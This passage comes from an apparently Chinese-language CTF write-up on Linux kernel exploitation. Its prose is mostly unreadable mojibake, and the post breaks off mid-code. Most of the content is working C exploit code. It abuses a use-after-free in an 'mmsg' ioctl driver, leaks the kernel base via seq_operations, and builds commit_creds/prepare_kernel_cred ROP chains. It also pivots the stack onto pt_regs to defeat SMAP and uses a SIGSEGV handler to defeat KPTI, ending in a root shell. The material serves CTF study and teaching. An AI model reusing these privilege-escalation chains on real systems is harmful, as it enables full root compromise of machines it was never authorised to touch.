<span class="title function_">new</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">recv_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_mmsg</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">put_mmsg</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *addr)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  arg.data = addr;</span><br><span class="line">  ioctl(fd, <span class="number">0x5555555</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_mmsg</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_arg));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  arg.data = (<span class="type">char</span> *)buf;</span><br><span class="line">  ioctl(fd, <span class="number">0x6666666</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line"> <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">asm</span>(</span><br><span class="line">   <span class="string">&quot;movq %%cs, %0;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%ss, %1;&quot;</span></span><br><span class="line">   <span class="string">&quot;movq %%rsp, %3;&quot;</span></span><br><span class="line">   <span class="string">&quot;pushfq;&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %2;&quot;</span></span><br><span class="line">   : <span class="string">&quot;=r&quot;</span>(user_cs),<span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_rsp)</span><br><span class="line">   : </span><br><span class="line">      : <span class="string">&quot;memory&quot;</span></span><br><span class="line">   );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;[x] seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">()</span> &#123;</span><br><span class="line">    fd1 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd2 = open(dev_name, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd2 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      err_exit(<span class="string">&quot;[x] open device 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_base</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// read æ“ä½œï¼Œç»è¿‡å‡½æ•°è°ƒç”¨é“¾åˆ™ä¼šæœ€ç»ˆè°ƒç”¨ seq_operations-&gt;start æŒ‡é’ˆå¯¹åº”çš„å‡½æ•°</span></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line">    get_mmsg(fd2);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;buf[%d] =&gt; 0x%llx\n&quot;</span>, j, buf[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base =&gt; 0x%llx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status(); </span><br><span class="line">    uaf();</span><br><span class="line">    leak_base();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rop</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¹‹å‰çš„éƒ½ä¸€æ ·</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> o(x) (x+kernel_offset)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// smep userspaceåœ°å€è¢«æ ‡è®°ä¸ºnon-executable</span></span><br><span class="line">    <span class="comment">// bypass: stack prviot</span></span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x40</span>];</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> user_rip = (<span class="type">size_t</span>)get_shell;</span><br><span class="line"></span><br><span class="line">    payload[idx++] = o(pop_rbx_ret);</span><br><span class="line">    payload[idx++] = o(commit_creds);</span><br><span class="line">    payload[idx++] = o(pop_rdi_ret); <span class="comment">// return address</span></span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = o(prepare_kernel_cred);</span><br><span class="line">    payload[idx++] = o(mov_edi_eax_call_rbx);</span><br><span class="line">    payload[idx++] = o(swapgs_restore_regs_and_return_to_usermode) + <span class="number">22</span>; </span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = user_rip;</span><br><span class="line">    payload[idx++] = user_cs;</span><br><span class="line">    payload[idx++] = user_rflags;</span><br><span class="line">    payload[idx++] = user_rsp;</span><br><span class="line">    payload[idx++] = user_ss;</span><br><span class="line">    </span><br><span class="line">    put_mmsg(fd2, (<span class="type">char</span> *)&amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger seq_file-&gt;start</span></span><br><span class="line">    read(seq_fd, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨xchg è¿›è¡Œç±»ä¼¼æ ˆè¿ç§»çš„æ“ä½œï¼Œä»è€Œè¿›è¡ŒåŠ«æŒå‡½æ•°æ‰§è¡Œæµ</p>
<p>åœ¨æœ¬åœ°æ‰§è¡Œæ—¶ï¼Œç›´æ¥kernel panicã€‚æŸ¥çœ‹æŠ¥é”™ä¿¡æ¯ï¼Œå‘ç°æ˜¯<code>can&#39;t access memory in 0x????(æ˜¯ä¸ªç”¨æˆ·åœ°å€)</code>ã€‚</p>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>åæ¥çœ‹æ¥ä¸€ä¸‹è¿™ç¯‡æ–‡ç« å‘ç°åŸå› ï¼š<a href="https://blog.wingszeng.top/kernel-pwn-struct-seq-operations-and-struct-pt-regs/#%E4%BE%8B%E9%A2%98-2023-pwnhub-%E5%85%AC%E5%BC%80%E8%B5%9B-kheap">Kernel Pwn Struct seq_operations and Struct pt_regs</a></p>
<ul>
<li>è¿™ä¸€é¢˜å¼€å¯äº†smapï¼Œè€Œ pwnhub çš„é‚£ä¸€é¢˜ä¸­æ²¡æœ‰ã€‚è€Œsmap: kernel space ä¸èƒ½ access user space çš„ä¸œè¥¿ã€‚</li>
<li>è¿™ç¯‡æ–‡ç« ä¸­è¯´äº†ä¸€ä¸ª <code>pt_regs</code> çš„ç»“æ„ä½“ï¼Œåœ¨ä½¿ç”¨syscall æ—¶ï¼Œä¼šå°†æŸäº›å¯„å­˜å™¨å†…å®¹å‹å…¥<code>å†…æ ¸æ ˆçš„æ ˆåº•</code>.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åœ¨ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹ä¸­, ä¸æ˜¯æ‰€æœ‰çš„å¯„å­˜å™¨éƒ½ä¼šè¢«æ”¹å˜, æ¯”å¦‚ r8 - r15, ä»–ä»¬ä¼šåœ¨å‹å…¥ pt_regs çš„æ—¶ä¿æŒ syscall ä¹‹å‰çš„å€¼. è¿™å°±ä¸ºæˆ‘ä»¬æä¾›äº†å¸ƒç½®æ•°æ®çš„å¯èƒ½æ€§. å¦‚æœåœ¨ä»…èƒ½åŠ«æŒ rip çš„æƒ…å†µä¸‹ (æ¯”å¦‚ä¸Šé¢ä»‹ç»çš„ seq_operations), è·³è½¬åˆ°æŸä¸ªå½¢å¦‚Â <code>add, rsp val; ret</code>Â çš„ gadget, é‚£ä¹ˆå°±æœ‰å¯èƒ½å°† rsp è®¾ç½®åˆ°å†…æ ¸æ ˆçš„ pt_regs ä¸Š, ä»è€Œæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®çš„ ROP é“¾.</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬ rop å¾€ å†…æ ¸æ ˆçš„ pt_regs ä¸­è·³è½¬ï¼Œå°±ä¸ä¼šç»•è¿‡äº†smap</p>
<p>å¦‚ä½•å°†å¯„å­˜å™¨å‹å…¥: ä½¿ç”¨äº†å·§å¦™åœ°æ–¹æ³•ï¼Œsyscall è°ƒç”¨ readï¼Œå°†å¯„å­˜å™¨å‹å…¥ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡seq_operations-&gt;startæ‰§è¡Œrop</p>
<p>è°ƒç”¨æ¨¡æ¿+è§£é‡Šçš„æ¯”è¾ƒè¯¦ç»†çš„æ–‡ç« ï¼š<a href="https://ywhkkx.github.io/2023/02/19/seq_operations%20+%20pt_regs/">seq_operations+pt_regs</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__asm__(  </span><br><span class="line">    <span class="string">&quot;mov r15, 0x55555555;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r14, 0x44444444;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r13, 0x33333333;&quot;</span>   </span><br><span class="line">    <span class="string">&quot;mov r12, 0x22222222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0xbbbb2222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r11, 0x11111111;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r10, 0x11110000;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r9,  0x99999999;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r8,  0x88888888;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;syscall&quot;</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>gadget: æ”¹å˜rsp, add rsp, xxx; retï¼Œè¿›è¡Œæ ˆè¿ç§»</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/2wi 0xffffffff81909b8c</span><br><span class="line">   0xffffffff81909b8c:  add    rsp,0x168</span><br><span class="line">   0xffffffff81909b93:  ret</span><br></pre></td></tr></table></figure>


<p>ä½†æ˜¯æˆ‘ä»¬éœ€è¦äº‹å…ˆçŸ¥é“æ‰§è¡Œstart æ—¶ä¸pt_regs è·ç¦»å¤šè¿œã€‚</p>
<p>ç›´æ¥ä½¿ç”¨æ²¡æœ‰å¸ƒå±€çš„è„šæœ¬ï¼Œè‡ªç„¶ä¼škernel panicï¼Œå¯ä»¥çœ‹åˆ°ripçš„å†…å®¹ï¼Œç„¶åä¸ä¸Šè¿°çš„payloadè¿›è¡Œå¯¹æ¯”ï¼Œè·å¾—åç§»</p>
<p>å¹¶ä¸”è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªä¸‡èƒ½çš„æ–¹æ³•</p>
<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>è¿˜æ˜¯ä¸å¯¹ï¼Œå› æ­¤å†çœ‹å‚è€ƒæ–‡ç« ï¼Œå¦‚ä¸‹ä¹Ÿå­˜åœ¨uafé—®é¢˜ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// module_ioctl</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> &#123;</span></span><br><span class="line">Â  Â  Â  Â  <span class="type">char</span> description[<span class="number">16</span>];</span><br><span class="line">Â  Â  Â  Â  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">case</span> MMSG_RECV: </span><br><span class="line">        <span class="keyword">if</span> (arg.top) &#123;</span><br><span class="line">            m = list_entry(&amp;mmsg_head-&gt;<span class="built_in">list</span>, <span class="keyword">struct</span> mmsg, <span class="built_in">list</span>);  <span class="comment">// head</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m = find_mmsg(arg.token);   <span class="comment">// éå†æŸ¥è¯¢</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="literal">NULL</span> || arg.size &gt; m-&gt;size || arg.size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;mmsg recv\n&quot;</span>);</span><br><span class="line">        copy_to_user((<span class="type">void</span> __user *)arg.data, m-&gt;data, arg.size);</span><br><span class="line">        list_del(&amp;m-&gt;<span class="built_in">list</span>);  <span class="comment">// åŒå‘é“¾è¡¨å…ƒç´ å†…æ ¸æä¾›çš„åˆ é™¤å‡½æ•°</span></span><br><span class="line">        kfree(m-&gt;data);      <span class="comment">// head æ²¡æœ‰ï¼Œä½†æ˜¯å›ºå®šåç§»ä¸º 0x10 çš„åœ°æ–¹ï¼Œç›¸å½“äºfreeæ‰listï¼Œä¸ä¼šæŠ¥é”™</span></span><br><span class="line">        kfree(m);          </span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><h4 id="åç§»ç¡®å®š"><a href="#åç§»ç¡®å®š" class="headerlink" title="åç§»ç¡®å®š"></a>åç§»ç¡®å®š</h4><p>add rsp valï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¯”è¾ƒå…·ä½“çš„å€¼</p>
<p>å¤§æ¦‚æ˜¯ <code>0x100+</code> çš„gadgetå§ï¼Œä¸å¤ªä¼šï¼Œä½†æ˜¯æ­¤ç»“æ„ä½“å¤§å°å¤§äº0x100ï¼Œå¹¶ä¸”è¦å¼€å¯syscallçš„æ ˆå¸§</p>
<ul>
<li>åº”è¯¥å¯ä»¥åœ¨ioctl ä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯æˆ‘å¤±è´¥äº†ğŸ˜¥</li>
</ul>
<h4 id="æ‰§è¡Œæµç¨‹"><a href="#æ‰§è¡Œæµç¨‹" class="headerlink" title="æ‰§è¡Œæµç¨‹"></a>æ‰§è¡Œæµç¨‹</h4><ul>
<li>ç›´æ¥çœ‹æŠ¥é”™:  BUG: unable to handle page fault for address: 0000000044444444 ï¼› RIP: 0010:0x44444444è·å¾—æˆ‘ä»¬ripæŒ‡é’ˆæ§åˆ¶çš„å¯„å­˜å™¨ r14</li>
<li>syscall ä¸ä¼šæ”¹å˜ r8-r15å†…å®¹ã€‚ç†æƒ³æƒ…å†µä¸‹r8-r15å†…å®¹ä¸å˜ï¼Œä½†æ˜¯å¯èƒ½ä¼šäº§ç”Ÿå¥‡å¦™çš„å˜åŒ–ã€‚è°ƒè¯•ï¼Œsiä¼šèµ°åˆ°startæŒ‡é’ˆçš„æ“ä½œï¼Œä»è€Œè·å¾—æ ˆç»“æ„</li>
<li>å‡è®¾ç†æƒ³åŒ–ä»r14-r8æ²¡æœ‰å‘ç”Ÿæ”¹å˜</li>
<li>si ä¸€è·¯èµ°ï¼Œä½†æ˜¯çœ‹ä¸åˆ°å¯¹åº”å†…å®¹?</li>
</ul>
<p><a href="https://b0ldfrev.gitbook.io/note/linux_kernel/kernelpwn-zhuang-tai-qie-huan-yuan-li-ji-kpti-rao-guo#0x2-bypass-kpti">KERNEL_PWNçŠ¶æ€åˆ‡æ¢åŸç†åŠKPTIç»•è¿‡</a></p>
<p>swapgs; iretq è¿”å›ç”¨æˆ·æ€; ret rip,åœ¨æ­¤å¤„æ²¡æœ‰ä½¿ç”¨retæŒ‡ä»¤ï¼Œç›´æ¥iretq, ç›´æ¥r9ä¸ºuser_rspå°±è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swapgs            </span><br><span class="line">iretq             </span><br><span class="line">rsp ---&gt; rip </span><br><span class="line">         cs</span><br><span class="line">         rflags</span><br><span class="line">         rsp</span><br><span class="line">         ss</span><br></pre></td></tr></table></figure>

<p>swapgs_restore_regs_and_return_to_usermode: è¿™ä¸ªæ¯”ä¸Šä¸ªå¤æ‚ä¸€ç‚¹ï¼Œéœ€è¦åœ¨è¿ç§»ä¸€æ¬¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode + 22  </span><br><span class="line">0 // padding  </span><br><span class="line">0 // padding  </span><br><span class="line">get_shell</span><br><span class="line">user_cs  </span><br><span class="line">user_rflags  </span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure>

<h4 id="errors"><a href="#errors" class="headerlink" title="errors"></a>errors</h4><ol>
<li>qemu cpuä¸º <code>host</code> ä¹Ÿå¿…é¡»å¼€å¯kvm, åŒæ—¶å°±æ˜¯è¿™ä¸€ç‚¹ï¼Œå¯¼è‡´æˆ‘ä¸€ç›´ä¸æˆåŠŸï¼Œåæ¥å»é™¤æ‰kvmå°†cpuæ”¹ä¸ºkvm64æˆåŠŸã€‚åº”è¯¥æ˜¯æœ¬æœºçš„CPUçš„å®‰å…¨é˜²æŠ¤å¯¼è‡´ä¸€ç›´å¤±è´¥ğŸ˜¥ã€‚</li>
</ol>
<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><p>signal bypass kptiã€‚æ‰§è¡Œç”¨æˆ·æ€çš„ä»»æ„ä»£ç éƒ½ä¼šæŠ¥å‡ºä¿¡å·<code>SIGSEGV</code>ï¼Œé‚£ä¹ˆåœ¨ç¨‹åºå¼€å§‹æ—¶å°†<code>SIGSEGV</code>ä¸shellå‡½æ•°ç»‘å®šåœ¨ä¸€èµ·ï¼Œé‚£ä¹ˆè®¿é—®ç”¨æˆ·æ€ä»£ç æ—¶å°±ä¼šæŠ¥å‡ºä¿¡å·<code>SIGSEGV</code>ï¼Œå°±ä¼šæ‰§è¡Œä¿¡å·å‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_YELLOW <span class="string">&quot;\033[33m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_debug(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;[*] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...)                                                     \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_GREEN <span class="string">&quot;[+] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,        \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_warning(fmt, ...)                                                  \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_YELLOW <span class="string">&quot;[!] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,       \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_RED <span class="string">&quot;[-] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,          \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> die(fmt, ...)                  \</span></span><br><span class="line"><span class="meta">  do &#123;                                 \</span></span><br><span class="line"><span class="meta">    log_error(fmt, ##__VA_ARGS__);          \</span></span><br><span class="line"><span class="meta">    log_error(<span class="string">&quot;Exit at line %d&quot;</span>, __LINE__); \</span></span><br><span class="line"><span class="meta">    exit(1);                           \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  die(<span class="string">&quot;fail to get shell&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    log_info(<span class="string">&quot;start to get root shell&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    log_info(<span class="string">&quot;status saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  die(<span class="string">&quot;seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_ALLOC 0x1111111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_COPY 0x2222222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_RECV 0x3333333</span></span><br><span class="line"><span 